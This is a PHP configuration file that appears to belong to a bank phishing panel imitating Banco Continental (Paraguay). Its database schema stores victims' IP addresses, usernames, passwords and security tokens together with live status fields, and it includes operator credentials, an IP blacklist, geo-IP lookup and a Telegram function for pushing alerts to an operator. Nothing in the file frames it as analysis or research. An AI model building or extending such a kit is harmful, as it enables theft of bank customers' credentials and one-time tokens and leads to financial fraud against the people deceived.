<?php
/**
 * ECO // BANCO CONTINENTAL - CORE SYSTEM CONFIGURATION
 * Database layer, Security, Telemetry & Telegram Alerts
 */

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// -------------------------------------------------------------
// 1. ENVIRONMENT & TIMEZONE
// -------------------------------------------------------------
date_default_timezone_set('America/Asuncion');
error_reporting(0);
ini_set('display_errors', '0');

// -------------------------------------------------------------
// 2. OPERATOR CREDENTIALS & TELEGRAM BOT CONFIGURATION
// -------------------------------------------------------------
define('ADMIN_USER', 'admin');
define('ADMIN_PASS', 'Ganador');

// Telegram Alerts Configuration (Opcional - rellenar si se requiere alertas en bot)
define('TELEGRAM_BOT_TOKEN', '');
define('TELEGRAM_CHAT_ID', '');
define('BANK_NAME', 'BANCO GNB');

// -------------------------------------------------------------
// 3. DATABASE CONNECTION (SQLite3)
// -------------------------------------------------------------
define('DB_FILE', __DIR__ . '/eco.db');

try {
    $db = new SQLite3(DB_FILE);
    $db->busyTimeout(5000);
    $db->exec('PRAGMA journal_mode = WAL;');
} catch (\Throwable $e) {
    die(json_encode(['status' => 'error', 'message' => 'Database connection failed: ' . $e->getMessage()]));
}

// Ensure database schema exists
$db->exec("
    CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        user TEXT,
        pass TEXT,
        token TEXT DEFAULT '',
        status TEXT DEFAULT 'WAITING',
        last_updated INTEGER,
        created_at INTEGER,
        is_typing INTEGER DEFAULT 0,
        device TEXT DEFAULT 'PC',
        token_changed INTEGER DEFAULT 0,
        identity_clicked INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS blacklist (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT UNIQUE,
        reason TEXT DEFAULT 'manual',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS admin_config (
        key TEXT PRIMARY KEY,
        value TEXT
    );

    CREATE TABLE IF NOT EXISTS system_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        operator_name TEXT,
        event_type TEXT,
        description TEXT,
        timestamp INTEGER
    );

    CREATE TABLE IF NOT EXISTS geoip_cache (
        ip TEXT PRIMARY KEY,
        country_code TEXT DEFAULT 'PY'
    );
");

// -------------------------------------------------------------
// 4. SECURITY & UTILITY FUNCTIONS
// -------------------------------------------------------------

function clean($data) {
    if (is_array($data)) {
        return array_map('clean', $data);
    }
    return htmlspecialchars(trim((string)$data), ENT_QUOTES, 'UTF-8');
}

function getUserIP(): string {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ips[0]);
    }
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '127.0.0.1';
}

$user_ip = getUserIP();

function getDevice(): string {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    if (strpos($ua, 'tablet') !== false || strpos($ua, 'ipad') !== false) {
        return 'Tablet';
    }
    if (strpos($ua, 'mobile') !== false || strpos($ua, 'android') !== false || strpos($ua, 'iphone') !== false) {
        return 'Mobile';
    }
    return 'PC';
}

function isAdmin(): bool {
    return !empty($_SESSION['admin_logged']) && $_SESSION['admin_logged'] === true;
}

function checkAdminSession(): void {
    if (!isAdmin()) {
        header('Location: login.php');
        exit;
    }
}

function isIpBlacklisted(SQLite3 $db, string $ip): bool {
    $stmt = $db->prepare("SELECT id FROM blacklist WHERE ip = :ip LIMIT 1");
    if ($stmt) {
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $res = $stmt->execute();
        if ($res && $res->fetchArray()) {
            return true;
        }
    }
    return false;
}

function resolveCountryCode(SQLite3 $db, string $ip): string {
    if ($ip === '127.0.0.1' || $ip === '::1' || !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return 'LOCAL';
    }
    $stmt = $db->prepare("SELECT country_code FROM geoip_cache WHERE ip = :ip");
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $res = $stmt->execute();
    if ($row = $res->fetchArray(SQLITE3_ASSOC)) {
        return $row['country_code'];
    }

    $code = 'PY'; // Default Banco Continental (Paraguay)
    try {
        $ctx = stream_context_create(['http' => ['timeout' => 1.5]]);
        $raw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode", false, $ctx);
        if ($raw) {
            $parsed = json_decode($raw, true);
            if (!empty($parsed['countryCode'])) {
                $code = $parsed['countryCode'];
            }
        }
    } catch (\Throwable $e) {}

    $ins = $db->prepare("INSERT OR REPLACE INTO geoip_cache (ip, country_code) VALUES (:ip, :code)");
    $ins->bindValue(':ip', $ip, SQLITE3_TEXT);
    $ins->bindValue(':code', $code, SQLITE3_TEXT);
    @$ins->execute();

    return $code;
}

function sendTelegram(string $message, string $parseMode = 'HTML'): bool {
    $token = defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '';
    $chatId = defined('TELEGRAM_CHAT_ID') ? TELEGRAM_CHAT_ID : '';

    if (empty($token) || empty($chatId)) {
        return false;
    }

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => $parseMode,
        'disable_web_page_preview' => true,
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);

    return $res !== false;
}
